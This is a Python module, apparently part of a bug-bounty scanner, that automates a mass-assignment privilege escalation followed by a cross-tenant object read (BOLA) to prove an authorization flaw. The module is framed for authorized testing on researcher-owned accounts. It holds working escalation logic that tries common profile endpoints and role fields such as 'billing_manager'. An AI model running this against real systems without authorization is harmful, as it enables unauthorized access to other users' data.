"""
core/cortex/minimal_amplification.py

The composed, submission-grade proof of an AUTHORIZATION STATE-TRANSITION failure.

Sentinel already has the two halves separately: `self_escalation` (a role field can
be self-assigned) and `owned_proof` (a two-persona cross-read works). A triager pays
for neither on its own — one shows a role can change, the other shows a boundary can
be crossed. What pays is the COMPOSITION: proving that the role change is *what
crossed the boundary*. Same object, denied before, allowed after.

    intended  : a `<role>` may read `<resource>` only inside its own workspace.
    observed  : accessor A changed its OWN role, then read owner B's `<resource>`
                in a foreign workspace — access that A did not have one request earlier.

The proof is a single DENIED→ALLOWED differential on ONE owner-created object:

    1. Owner B creates one safe, researcher-owned object of a caller-named type.
    2. Accessor A reads that exact object BEFORE escalating          → require 401/403/404.
    3. A self-assigns the least-spicy plausible role (mass assignment on its OWN
       account), confirmed by a separate profile read.
    4. A re-reads the SAME object ONCE                                → require 2xx + B's marker.
    5. Emit ONE composed finding carrying the authorization-matrix delta, then STOP.

Discipline:
  * Least-spicy first. Roles are tried in the caller's priority order and the first
    one that AMPLIFIES access wins — a role that merely "sticks" but unlocks nothing
    is not the proof (that is the difference between `self_escalation` and this).
  * The same object is used before and after — the cleanest possible delta.
  * The composer creates ONLY the object types the caller lists. There is no built-in
    "safe noun" filter here (unlike owned_proof) precisely because the whole point is
    a *sensitive* class (billing) — so the caller owns the decision that these types
    are safe to create as throwaway researcher-owned objects.
  * Every request goes through the policy executor, so the bounty-safe budget still
    bounds the whole thing (one create, one privilege mutation, one 2xx cross-read).

The evidence lives on the PROOF, not the report: the proof knows what happened, so it
emits `authorization_matrix_delta` / `novelty_claims` / `object_class_sensitivity` /
`intended_invariant` / `observed_violation` itself. A reporter formats them; it does
not invent them after the fact.
"""

from __future__ import annotations

import logging
import os
import re
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from core.safety.action_classifier import CROSS_OBJECT_READ, OWNED_CREATE, PRIVILEGE_MUTATION
from core.wraith.bola import _stringify
from core.wraith.bola_probe import _deep_get, _mine_openapi
from core.wraith.logic_probe import _obj_id

logger = logging.getLogger(__name__)

Send = Callable[..., Awaitable[Any]]   # policy-executor send: (method, url, body, **intent)

_PARAM_RE = re.compile(r"\{([^}]+)\}")

# Profile shape discovery. The role WRITE endpoint is often distinct from the role
# READ endpoint (AwardForge writes at /api/me/profile, reads at /api/me), so the two
# are tried separately — the escalator primitives that assume one endpoint don't fit.
_PROFILE_READ_PATHS = ["/api/me", "/api/users/me", "/users/v1/me", "/me",
                       "/account", "/api/account", "/profile", "/api/profile"]
_PROFILE_WRITE_PATHS = ["/api/me/profile", "/api/me", "/api/users/me", "/users/v1/me",
                        "/me", "/api/profile", "/profile", "/account"]
_ROLE_FIELDS = ["role", "roles", "userRole", "user_role", "accountType", "account_type", "type"]

# Sensible defaults; the caller (scans wiring / validation harness) overrides per target.
_DEFAULT_OBJECTS = ["invoices", "documents"]
_DEFAULT_ROLES = ["billing_manager", "workspace_admin", "support_agent"]

# Object noun → sensitivity class a triager cares about. Sensitive first is the point.
_SENSITIVITY = {"invoice": "billing", "payment": "billing", "billing": "billing",
                "card": "financial", "order": "commerce", "document": "low",
                "note": "low", "task": "low", "file": "low"}


def _nonce(tag: str) -> str:
    return f"sf{tag}_{os.urandom(5).hex()}"


def _origin(target: str) -> str:
    p = urlparse(target if "://" in target else "http://" + target)
    return f"{p.scheme}://{p.netloc}"


def _noun(collection: str) -> str:
    segs = [s for s in collection.strip("/").lower().split("/")
            if s and not re.match(r"^v\d+$", s) and s not in ("api", "rest")
            and not _PARAM_RE.match(s)]
    return segs[-1] if segs else collection.strip("/").lower()


def _singular(word: str) -> str:
    w = word.strip("/").lower()
    if w.endswith("ies"):
        return w[:-3] + "y"
    return w[:-1] if (w.endswith("s") and not w.endswith("ss")) else w


def _sensitivity(noun: str) -> str:
    return _SENSITIVITY.get(_singular(noun), "unknown")


# ------------------------------------------------------------------- proof objects

@dataclass
class AuthorizationMatrixDelta:
    """One cell of the intended authorization matrix, and how reality contradicts it.

    Normalized on purpose: real programs won't call it a "matrix delta", but every
    authorization-transition bug has exactly this shape — a principal, a resource, a
    scope, and an expected verdict that the server actually flips.
    """
    principal_before: str
    principal_after: str
    resource: str
    scope: str
    expected: str = "deny"
    actual: str = "allow"

    def as_dict(self) -> Dict[str, str]:
        return {"principal_before": self.principal_before, "principal_after": self.principal_after,
                "resource": self.resource, "scope": self.scope,
                "expected": self.expected, "actual": self.actual}


@dataclass
class AmplifiedOwnedProof:
    owner_persona: str
    accessor_persona: str
    object_type: str
    object_ref: str
    create_endpoint: str
    write_endpoint: str
    delta: AuthorizationMatrixDelta
    object_class_sensitivity: str
    pre_status: int
    post_status: int
    leaked_markers: List[str]
    role_confirmed_by: str                      # how the escalated role was re-confirmed
    novelty_claims: List[str] = field(default_factory=list)
    severity: str = "HIGH"

    @property
    def intended_invariant(self) -> str:
        return (f"A {self.delta.principal_after!r} may access {self.object_type} objects "
                f"only inside their own workspace.")

    @property
    def observed_violation(self) -> str:
        return (f"account {self.accessor_persona!r} changed its own role "
                f"{self.delta.principal_before!r}→{self.delta.principal_after!r} and then read "
                f"account {self.owner_persona!r}'s {self.object_type} object in a foreign workspace "
                f"({self.pre_status}→{self.post_status} on the same object).")

    def restraint(self) -> Dict[str, Any]:
        # The proof knows exactly what it did: one owned object, one real (2xx) cross-read.
        return {"owned_test_accounts_only": True, "cross_object_reads": 1,
                "destructive_actions_sent": 0, "stopped_after_first_proof": True}

    def to_finding(self, proof_mode: str = "bounty_safe") -> Dict[str, Any]:
        return {
            "type": "Escalation-amplified BOLA (authorization state-transition, composed proof)",
            "severity": self.severity,
            "tool": "minimal_amplification",
            "target": self.object_ref,
            "message": (
                f"Authorization state-transition failure: account {self.accessor_persona!r} could NOT "
                f"read account {self.owner_persona!r}'s {self.object_type} object (HTTP {self.pre_status}), "
                f"self-assigned role {self.delta.principal_after!r} via {self.write_endpoint} "
                f"({self.role_confirmed_by}), then read the SAME object (HTTP {self.post_status}) with "
                f"{self.owner_persona!r}'s private marker present. One object, one amplified read, then stopped."),
            "tags": ["verified", "exploit_chain", "escalation_amplified_bola", "mass_assignment",
                     "bola", "broken_access_control", "authorization_matrix_violation", "minimal_impact"],
            "families": ["confirmed_vuln"],
            "metadata": {
                "vuln_class": "exploit_chain",
                "kind": "escalation_amplified_bola",
                "subtype": "owned_two_persona_role_amplified",
                "proof_mode": proof_mode,
                "owner_persona": self.owner_persona,
                "accessor_persona": self.accessor_persona,
                "object_type": self.object_type,
                "object_ref": self.object_ref,
                "create_endpoint": self.create_endpoint,
                "intended_invariant": self.intended_invariant,
                "observed_violation": self.observed_violation,
                "authorization_matrix_delta": self.delta.as_dict(),
                "novelty_claims": list(self.novelty_claims),
                "object_class_sensitivity": self.object_class_sensitivity,
                "ownership_markers": {"planted": list(self.leaked_markers)},
                "real_data_accessed": False,
                "restraint": self.restraint(),
            },
        }


# ------------------------------------------------------------- discovery + provisioning

async def _identity(origin: str, send: Send, read_paths: List[str]) -> Tuple[Optional[str], Dict[str, Any]]:
    """Discover a profile read endpoint and return (endpoint, identity_dict)."""
    for ep in read_paths:
        try:
            st, me = await send("GET", origin + ep, None)
        except Exception:
            continue
        if 200 <= int(st) < 300 and isinstance(me, dict):
            return ep, me
    return None, {}


def _role_of(ident: Dict[str, Any]) -> Tuple[str, str]:
    """(role_field, role_value) from an identity dict; defaults to a low-priv baseline."""
    for f in _ROLE_FIELDS:
        v = _deep_get(ident, f)
        if v is not None:
            return f, str(v)
    return "role", "member"


def _resolve_params(template: str, ctx: Dict[str, Any], obj_id: Optional[Any]) -> Optional[str]:
    """Fill a path template: a param that matches an identity key (workspace_id) uses
    that value; the remaining (object id) param uses the created object's id."""
    out = template
    for param in _PARAM_RE.findall(template):
        v = _deep_get(ctx, param)
        if v is None:
            v = obj_id
        if v is None:
            return None
        out = out.replace("{" + param + "}", str(v))
    return out


def _build_valid_body(props: Dict[str, Any]) -> Tuple[Dict[str, Any], List[str]]:
    """A schema-valid create body with planted nonces. Honors `format: email` and
    `enum` so a validated field (EmailStr) isn't rejected. Markers = the nonce string
    values — owner-private data the accessor cannot have supplied."""
    body: Dict[str, Any] = {}
    markers: List[str] = []
    for name, sch in (props.items() if isinstance(props, dict) else []):
        sch = sch if isinstance(sch, dict) else {}
        t, fmt, enum = sch.get("type", "string"), sch.get("format"), sch.get("enum")
        if enum:
            body[name] = enum[0]
        elif t == "string":
            if fmt == "email":
                val = f"sf_{os.urandom(4).hex()}@example.com"
            elif fmt in ("uri", "url", "hostname"):
                val = f"sf-{os.urandom(4).hex()}"          # NOT absolute → no side-effect class
            else:
                val = _nonce(name[:3])
            body[name] = val
            markers.append(val)
        elif t in ("integer", "number"):
            body[name] = sch.get("example", sch.get("default", 1))
        elif t == "boolean":
            body[name] = bool(sch.get("default", False))
    return body, markers


async def _provision_owned_object(
    origin: str, owner_send: Send, owner_ctx: Dict[str, Any], object_types: List[str],
) -> Optional[Tuple[str, str, str, List[str], str]]:
    """Owner creates ONE object of the highest-priority listed type. Returns
    (object_type, create_url, read_url, markers, sensitivity) or None."""
    try:
        specs = await _mine_openapi(origin, owner_send)
    except Exception:
        specs = []
    for want in object_types:
        want_l = want.strip("/").lower()
        for spec in specs:
            coll = spec["collection"]
            if want_l not in coll.lower() and _singular(_noun(coll)) != _singular(want_l):
                continue
            create_url = _resolve_params(coll, owner_ctx, None)
            if create_url is None:                          # unresolved path param → skip
                continue
            body, markers = _build_valid_body(spec["props"])
            if not markers:
                continue
            try:
                st, created = await owner_send("POST", origin + create_url, body, hint=OWNED_CREATE)
            except Exception:
                continue
            if not (200 <= int(st) < 300):
                continue
            read_url = _resolve_params(spec["byid"], owner_ctx, _obj_id(created))
            if not read_url:
                continue
            noun = _singular(_noun(coll))
            logger.info("[minimal_amplification] owner %s created one %s at %s",
                        "B", noun, create_url)
            return noun, origin + create_url, origin + read_url, markers, _sensitivity(noun)
    return None


# ------------------------------------------------------------------- the composed proof

async def prove_minimal_escalation_amplified_bola(
    target: str,
    *,
    owner_send: Send,                 # persona B — creates the object
    accessor_send: Send,              # persona A — escalates + reads
    escalation_values: Optional[List[str]] = None,
    object_types: Optional[List[str]] = None,
    owner_persona: str = "B",
    accessor_persona: str = "A",
    role_write_paths: Optional[List[str]] = None,
    max_roles: int = 3,
) -> Optional[AmplifiedOwnedProof]:
    """Confirm an escalation-amplified BOLA as one composed proof on a single owned
    object. Returns None unless a self-assigned role flips the SAME foreign read from
    denied to a 2xx that leaks the owner's marker. Best-effort; never raises."""
    origin = _origin(target)
    roles = list(escalation_values or _DEFAULT_ROLES)
    objects = list(object_types or _DEFAULT_OBJECTS)
    write_paths = list(role_write_paths or _PROFILE_WRITE_PATHS)

    # Personas' identities (owner's workspace fills object paths; accessor's role is the delta baseline).
    _, owner_ctx = await _identity(origin, owner_send, _PROFILE_READ_PATHS)
    read_ep, accessor_ident = await _identity(origin, accessor_send, _PROFILE_READ_PATHS)
    role_field, baseline_role = _role_of(accessor_ident)

    prov = await _provision_owned_object(origin, owner_send, owner_ctx, objects)
    if prov is None:
        return None
    object_type, create_url, read_url, markers, sensitivity = prov

    # (2) Same object, BEFORE escalation — must be denied, or there's nothing to amplify.
    try:
        st_pre, _ = await accessor_send(
            "GET", read_url, None, hint=CROSS_OBJECT_READ, target_is_researcher_owned=True,
            target_owner=owner_persona, actor=accessor_persona,
            proof_goal="pre_escalation_boundary_check")
    except Exception:
        return None
    if 200 <= int(st_pre) < 300:
        # Already readable at baseline → this is plain BOLA, not amplification. Not ours.
        logger.info("[minimal_amplification] baseline already reads the object — not an amplification")
        return None
    if int(st_pre) not in (401, 403, 404):
        return None

    working_write: Optional[str] = None            # cache the write path that sticks

    # (3)-(4) Least-spicy first: escalate, confirm, re-read the SAME object.
    tried = 0
    for role in roles:
        if tried >= max_roles:
            break
        if str(role).lower() == str(baseline_role).lower():
            continue
        tried += 1

        confirmed = False
        candidates = [working_write] if working_write else write_paths
        for wp in candidates:
            if wp is None:
                continue
            wrote = False
            for method in ("PATCH", "PUT"):
                try:
                    st, _ = await accessor_send(method, origin + wp, {role_field: role})
                except Exception:
                    continue
                if 200 <= int(st) < 300:
                    wrote = True
                    break
            if not wrote:
                continue
            # Confirm via a SEPARATE profile read (not the write echo).
            try:
                st2, me = await accessor_send("GET", origin + (read_ep or wp), None)
            except Exception:
                continue
            if 200 <= int(st2) < 300 and str(_deep_get(me, role_field)) == str(role):
                confirmed, working_write = True, wp
                break
        if not confirmed:
            continue

        # (4) Re-read the SAME object exactly once as the now-escalated principal.
        try:
            st_post, resp = await accessor_send(
                "GET", read_url, None, hint=CROSS_OBJECT_READ, target_is_researcher_owned=True,
                target_owner=owner_persona, actor=accessor_persona,
                proof_goal="post_escalation_amplified_read")
        except Exception:
            continue
        if not (200 <= int(st_post) < 300):
            continue                                # role stuck but did NOT amplify → try next
        leaked = [m for m in markers if m and m in _stringify(resp)]
        if not leaked:
            continue

        # (5) Amplification confirmed. Emit one composed finding and STOP.
        delta = AuthorizationMatrixDelta(
            principal_before=str(baseline_role), principal_after=str(role),
            resource=object_type, scope="foreign_workspace", expected="deny", actual="allow")
        logger.info("[minimal_amplification] AMPLIFIED: %s→%s flips %s read %s→%s",
                    baseline_role, role, object_type, st_pre, st_post)
        return AmplifiedOwnedProof(
            owner_persona=owner_persona, accessor_persona=accessor_persona,
            object_type=object_type, object_ref=read_url, create_endpoint=create_url,
            write_endpoint=origin + str(working_write), delta=delta,
            object_class_sensitivity=sensitivity, pre_status=int(st_pre), post_status=int(st_post),
            leaked_markers=leaked, role_confirmed_by="a separate profile read reflects the new role",
            novelty_claims=["role_transition_required", "foreign_workspace_access",
                            "matrix_cell_violation", "owned_two_persona_proof"])
    return None
